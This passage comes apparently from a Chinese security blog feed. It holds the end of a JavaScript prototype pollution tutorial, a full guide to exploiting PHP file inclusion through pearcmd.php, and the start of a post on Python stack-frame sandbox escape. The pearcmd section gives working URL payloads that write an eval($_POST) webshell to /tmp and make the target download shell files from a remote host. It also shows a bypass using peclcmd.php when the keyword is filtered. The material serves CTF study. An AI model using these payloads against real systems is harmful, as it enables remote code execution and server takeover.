language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<p><img src="/2024/06/19/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80/image-20240608155806850.png" alt="image-20240608155806850"></p>
<p>这里虽然合并成功了，但是原型链，没有被污染</p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>将代码改成如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>) </span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p><code>JSON.parse()</code>方法用来解析JSON字符串，构造由字符串描述的 javascript 值或对象。</p>
<p>由结果可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><img src="/2024/06/19/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80/image-20240608160007980.png" alt="image-20240608160007980"></p>
<p>由此可以进行简单的变量赋值等操作。</p>
<p>参考文章：</p>
<p><code>https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</code></p>
<p><code>https://xz.aliyun.com/t/10809?time__1311=mq%2BxB75QqxnDlxGgrDy7Lc7eYqAKUqx#toc-4</code></p>
]]></content>
      <categories>
        <category>node.js</category>
        <category>js原型链污染</category>
      </categories>
  </entry>
  <entry>
    <title>利用pearcmd.php进行文件包含</title>
    <url>/2024/04/28/pearcmd.php/</url>
    <content><![CDATA[<h3 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h3><p>好看，爱看，多看</p>
<span id="more"></span>

<p><strong>文件包含还可以利用<code>pearcmd.php</code>这个pecl&#x2F;pear中的文件。</strong></p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7,4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装</p>
<p><strong>不过，在Docker任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径一般在<code>/usr/local/lib/php</code>。</strong></p>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。<strong>但当遇到是一个文件包含的场景，那么我们就可以包含到pear中的文件</strong>，进而利用其中的特性搞事。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>有pear扩展（这样才能有pearcmd.php）</li>
<li>php开启了<code>register_argc_argv</code>选项</li>
<li>知道pearcmd.php的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</li>
<li>有包含点，能包含php后缀的文件，而且没有open_basedir的限制</li>
</ul>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>注意：以下测试均是镜像为<code>php:7.2-apache</code>并且<code>register_argc_argv</code>为On</p>
<p><strong>对于<code>register_argc_argv</code>选项，</strong>如果这个选项字段选了<code>ON</code>的话，**URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，而且就算后面的内容含有等号也会被作为键值被赋值给<code>$_SERVER[&#39;argv&#39;]</code>**，如下所示：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427211536292.png" alt="image-20240427211536292"></p>
<p>pear程序在执行pear命令的时候会在<code>pearcmd.php</code>获取命令行参数，看看pearcmd.php代码：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="regexp">//</span> fix CGI sapi oddity - the -- in pear.bat/pear is <span class="keyword">not</span> removed</span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; isset($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    unset($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>$argv</code>的赋值，再看看pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里先看<code>$argv</code>是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就尝试<code>$_SERVER[&#39;argc&#39;]</code>是否存在，注意这个参数我们可通过<code>query-string</code>控制。（个人看了几篇文章，应该都是直接利用<code>$SERVER[&#39;argv&#39;]</code>，稍微注意一下）</p>
<p>看一看可以利用的参数：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427210050568.png" alt="image-20240427210050568"></p>
<p>其中的<code>config-create</code>、<code>install</code>、<code>download</code>可以尝试利用。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>这里需要包含pearcmd.php的原因就是这样才能执行pear程序。</p>
<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>为了方便理解后面的payload，这里稍微提前说一点知识，</p>
<ul>
<li>如上所说，<code>register_argc_argv</code>选项为On的时候，URL中?后面的内容都会传入<code>$_SERVER[&#39;x&#39;]</code>，但是对于不同符号有区别，看下图比较：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222128934.png" alt="image-20240426222128934"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222206499.png" alt="image-20240426222206499"></p>
<p><img src="/2024/04/28/pearcmd.php/image-20240426222235994.png" alt="image-20240426222235994"></p>
<p><strong>由此可以很容易看出&amp;是无法分割参数的，真正能优先分隔参数的是+号。</strong></p>
<ul>
<li>为什么最前面需要一个+号？看看我们的payload传上去后变量的值，如下：</li>
</ul>
<p><img src="/2024/04/28/pearcmd.php/image-20240427223551642.png" alt="image-20240427223551642"></p>
<p>这里可以看到数组下标为0的内容为空，此时结合pearcmd.php的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="line">if (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123;</span><br><span class="line">    unset($argv[1]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br><span class="line">$progname = PEAR_RUNTYPE;</span><br><span class="line">array_shift($argv);</span><br><span class="line">$options = Console_Getopt::getopt2($argv, &quot;c:C:d:D:Gh?sSqu:vV&quot;);</span><br><span class="line">if (PEAR::isError($options)) &#123;</span><br><span class="line">    usage($options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意if条件的内容，以及<code>array_shift()</code>函数，函数说明如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240427224040193.png" alt="image-20240427224040193"></p>
<p>注意if条件的内容，这个if语句的处理是直接对argv[1]进行分析，所以第一个元素不会发挥作用，故这里需要将第一个单元利用+设置为空字符或其他不会影响pear命令正常执行的参数都可以</p>
<p>同时可以看看这个函数，个人感觉还是挺有关系的。</p>
<h6 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h6><p>对于这个命令，<strong>主要作用就是将内容写入文件中</strong>，需要传入两个参数，第一个参数会被写入到文件中，其中第二个参数是写入的文件路径。</p>
<p>构造出的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/hello.php</span><br><span class="line"></span><br><span class="line">注意：可以这样设置一句话木马：</span><br><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt; </span><br><span class="line">防止多个输出，推荐！！</span><br></pre></td></tr></table></figure>

<p>然后<strong>包含hello.php用蚁剑或者直接连就行</strong>。</p>
<p>测试了一下，不能直接在浏览器上传payload，由于直接在浏览器传参使得php的如<code>&lt;</code>和单引号等标签因被URL编码而失去效应，<strong>需要抓包后再传参</strong>这样才能被识别为php代码，可以防止浏览器将传入的字符编码。</p>
<p><strong>对比一下即可：</strong></p>
<p>正常抓包后传参：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428013848033.png" alt="image-20240428013848033"></p>
<p>直接传参结果如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428014007326.png" alt="image-20240428014007326"></p>
<p>可以很明显的看出第一张图片中的一句话木马成功作为php代码被解析，所以可以正常利用，</p>
<p>同时第二张图片也可以看出来并没有正常解析，<strong>所以谨记要抓包后传参。</strong></p>
<p><strong>一定注意</strong>：需要抓包后修改，因为浏览器会url编码再传入，会导致php的如<code>&lt;</code>等标签会被编码而失去效应</p>
<h6 id="install"><a href="#install" class="headerlink" title="install"></a>install</h6><p>可以利用install远程连接一个vps下载文件到靶机的临时目录里，再包含这个文件达成rce。</p>
<p><code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录</p>
<p>使用的payload为(基本上不行，主要看下面那个)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xxx.xxx/123.php</span><br></pre></td></tr></table></figure>

<p>同样还是抓包传payload（方便），页面回显</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428015602654.png" alt="image-20240428015602654"></p>
<p>这串Payload下载后的文件保存的路径是<code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download</code>，显示不可写，这是配置问题，因为这个目录时新建的，没有权限对其写入从而导致失败。</p>
<p><strong>另外的payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http:<span class="comment">//[ip]:[port]/shell.txt</span></span><br></pre></td></tr></table></figure>

<p>抓包放包后页面如下：</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022500841.png" alt="image-20240428022500841"></p>
<p>这里给出了路径，然后去包含这个路径即可</p>
<p><img src="/2024/04/28/pearcmd.php/image-20240428022535506.png" alt="image-20240428022535506"></p>
<p>测试了一下，<strong>这个shell文件最好不要是php文件，只要有php特征即可</strong>，反正文件包含在识别到后会当做php文件执行。</p>
<h6 id="download"><a href="#download" class="headerlink" title="download"></a>download</h6><p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://xxxxxxx/shell.jpg</span><br></pre></td></tr></table></figure>

<p>这个是直接下载到当前页面。</p>
<p>一直没复现出来，最后要用的时候再搜吧。这里显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">downloading shell.txt ...</span><br><span class="line">Could not download from &quot;http://47.100.223.173/shell.txt&quot; (could not open /var/www/html/shell.txt for writing)</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>

<h6 id="写入配置文件"><a href="#写入配置文件" class="headerlink" title="写入配置文件"></a>写入配置文件</h6><p>类似于第一个，也复现成功</p>
<p>其他的利用方式，个人感觉挺好的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear -c /tmp/shell.php -d man_dir=&lt;?=eval($_POST[&#x27;x&#x27;]);?&gt; -s</span><br></pre></td></tr></table></figure>

<p>看看选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-0-6-ubuntu:~/somefile# pear help options</span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration in `file&#x27;</span><br><span class="line">     -C file    find system configuration in `file&#x27;</span><br><span class="line">     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;</span><br><span class="line">     -G         start in graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     unset `foo&#x27; in the user configuration</span><br><span class="line">     -h, -?     display help/usage (this message)</span><br><span class="line">     -V         version information</span><br></pre></td></tr></table></figure>

<p>相当于写配置到<code>/tmp/shell.php</code>,payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/shell.php+-d+man_dir=&lt;?eval($_POST[&#x27;x&#x27;]);?&gt;+-s+</span><br></pre></td></tr></table></figure>

<p>复现成功：<br><img src="/2024/04/28/pearcmd.php/image-20240428032008052.png" alt="image-20240428032008052"></p>
<h5 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h5><p>当<code>pearcmd</code>关键词被ban，可以使用<code>peclcmd.php</code>作为平替，在这个php文件中其实就是引用了pearcmd.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>





<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
]]></content>
      <categories>
        <category>php相关漏洞</category>
        <category>文件包含</category>
        <category>利用pearcmd.php</category>
      </categories>
  </entry>
  <entry>
    <title>python栈帧逃逸</title>
    <url>/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="python栈帧逃逸"><a href="#python栈帧逃逸" class="headerlink" title="python栈帧逃逸"></a>python栈帧逃逸</h1><p>一个挺新的逃逸方式，最近比赛都在考，赶快学习。</p>
<span id="more"></span>

<h3 id="生成器（henerator）"><a href="#生成器（henerator）" class="headerlink" title="生成器（henerator）"></a>生成器（henerator）</h3><p>Python生成器是一个特殊的迭代器，可以逐个产生元素，而不是一次性产生所有元素。生成器的工作方式与迭代器相似，<strong>可以通过for循环或者<code>__next__()</code>方法（或者使用next()函数）逐个获取生成器中的元素。</strong></p>
<p>生成器<strong>使用yield关键字来定义生成器函数</strong>。迭代器在执行的过程中，<u>遇到yield语句时</u>，函数执行过程会被暂停，此时会保留函数的状态，<u>并将yield 后面的表达式作为当前迭代的值返回</u>。当再次调用生成器时，生成器会从上次暂停的位置继续执行，直到遇到下一个yield语句。</p>
<p>给一个例子看看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:   <span class="comment">#注意这里有一个循环</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#next()函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="comment">#__next__()方法</span></span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="comment">#for循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">ha</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">3</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">4</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<p>根据这个结论可以基本了解工作过程，在调用这个生成器函数时，<strong>它会立即返回一个生成器对象，而不是执行函数体</strong>。然后再调用生成器对象的<code>__next__</code>方法或next()函数时，生成器会从上次暂停的位置即系执行，直到遇到下一个yield语句。</p>
<p><strong>注意一个生成器里面可以有多个yield关键字</strong>，流程不变，但是如果生成器在反复执行的时候，如果找不到下一个yield，或引发StopIteration错误，测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#但是此时只要多一个print(next(c))就会报错StopIteration</span></span><br></pre></td></tr></table></figure>

<p>注意看注释部分，这里说明了返回对象没有限制，但是对于yield关键字使用next()时需要根据语法有限制。</p>
<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p>
<p>生成表达式的语法与列表推导式类似，但是使用圆括号而不是方括号，可以使用for循环遍历生成器对象，或者使用next()函数逐个获取生成器中的元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000020AA0D8D630</span>&gt;</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">ha</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>



<h3 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h3><p><code>gi_code</code>：生成器对应的code对象。</p>
<p><code>gi_frame</code>：生成器对应的frame（栈帧）对象</p>
<p><code>gi_running</code>：生成器是否在执行。生成器函数在yield以后、执行yield的下一行代码前初遇frozen状态，此时这个属性的值为0。</p>
<p><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<p><strong>这里的重点是<code>gi_frame</code> 属性</strong></p>
<p><code>gi_frame</code>是一个与生成器和协程相关的属性。它指向生成器或协程当前执行的帧对象，如果这个生成器或者协程正在执行的话。帧对象表示代码执行的当前上下文，<strong>包含了局部遍历、执行的字节码指令等信息。</strong></p>
<h3 id="生成器的执行原理"><a href="#生成器的执行原理" class="headerlink" title="生成器的执行原理"></a>生成器的执行原理</h3><p><strong>先简单了解堆栈：</strong></p>
<p>都是内存管理方式，来看不同点</p>
<ul>
<li>堆是在程序运行时，申请某个大小的内存空间。堆的内存都是动态分配的，在访问时和一般内存的访问没有区别，用。</li>
<li>栈遵循的原则就是后进先出，它在栈顶进行插入和删除操作。</li>
</ul>
<p>————————————————————————————<br>而对于生成器的执行原理，如下：<br>在每个代码块（模块、类、函数）运行的时候，Python解释器会先为其创建一个栈帧，同时与物理栈帧不同，python 解释器所创建的帧栈是在进程的堆区创建的，这样的话在帧栈就是被 python 解释器所控制，<strong>只要不主动释放，代码块的栈帧仍会存在，我们依然能够获取到已经执行完代码的帧栈</strong><br><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605142732236.png" alt="image-20240605142732236"></p>
<h3 id="栈帧（frame）"><a href="#栈帧（frame）" class="headerlink" title="栈帧（frame）"></a>栈帧（frame）</h3><p>在Python中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<strong>每当Python解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息</strong>。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<p>栈帧的重要属性：<br><code>f_locals</code>：一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</p>
<p><code>f_globals</code>：包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
<p><code>f_builtins</code>：表示当前帧的内置命名空间，包含了所有的内置变量和函数。</p>
<p><code>f_code</code>：一个代码对象，包含了函数或方法的字节码指令、常量、变量名等信息。</p>
<p><code>f_lasti</code>：整数，表示最后执行的字节码指令的索引。</p>
<p><code>f_back</code>：调用栈的前一帧</p>
<p>**这里介绍一下<code>f_code</code>**：</p>
<p>（这个是我从题里面看到的，学一下）</p>
<p>一个代码对象，<em>它包含了函数的字节码</em>、函数的全局和局部命名空间以及其他信息，对象具有以下属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">co_argcount: 函数的命名参数数量（不包括 *args 和 **kwargs）。</span><br><span class="line">co_nlocals: 函数中的局部变量数量。</span><br><span class="line">co_stacksize: 函数调用所需的栈空间。</span><br><span class="line">co_consts: 函数中使用的常量。</span><br><span class="line">co_names: 函数中使用的全局变量的名称。</span><br><span class="line">co_varnames: 函数中使用的局部变量的名称。</span><br><span class="line">co_filename: 函数定义所在的文件名。</span><br><span class="line">co_firstlineno: 函数定义的第一行所在的行号。</span><br><span class="line">co_flags: 与函数相关的标志，例如是否是生成器函数、是否接受任意数量的位置参数等等。</span><br><span class="line">co_code: 函数的字节码指令序列。</span><br></pre></td></tr></table></figure>

<p>先看一下如下代码：</p>
<p>比如我想得到一个对象的字节码，这里使用dis模块将字节码反汇编，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    flag=<span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha)) <span class="comment">#这里打印字节码</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;haha&#x27;</span>)</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">10</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>常见的字节码指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD_CONST：加载一个常量</span><br><span class="line">LOAD_FAST: 在局部作用域中(比如函数)加载一个当前作用域的局部变量</span><br><span class="line">LOAD_GLOBAL: 在局部作用域(比如函数)中加载一个全局变量或者内置变量</span><br><span class="line">LOAD_NAME: 在全局作用域中加载一个全局变量或者内置变量</span><br><span class="line">STORE_FAST: 在局部作用域中定义一个局部变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_GLOBAL: 在局部作用域中定义一个global关键字声明的全局变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_NAME: 在全局作用域中定义一个全局变量, 来建立和某个对象之间的映射关系</span><br></pre></td></tr></table></figure>

<p>注意看这里的Output，flag的值是完整被打印出来的，</p>
<p><strong>结合这个特点，在栈帧逃逸中我们可以尝试读取字节码来读取flag</strong>，就需要用到<code>co_consts</code>属性来读取。</p>
<p>思路如上，具体操作可以看下面的CISCN的例题</p>
<p><strong>获取到内置方法的格式可以如下：</strong></p>
<p>从全局变量获取到了内置命名空间，注意在利用内置函数的时候一定要想到这个点，不一定可以用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>)如何获取，可以另外用一个变量来获取，再利用，如下：</span><br><span class="line"><span class="built_in">str</span>=d.<span class="built_in">str</span>  <span class="comment">#这样就可以直接利用str来替代内置函数str()</span></span><br><span class="line"><span class="built_in">print</span>(<span 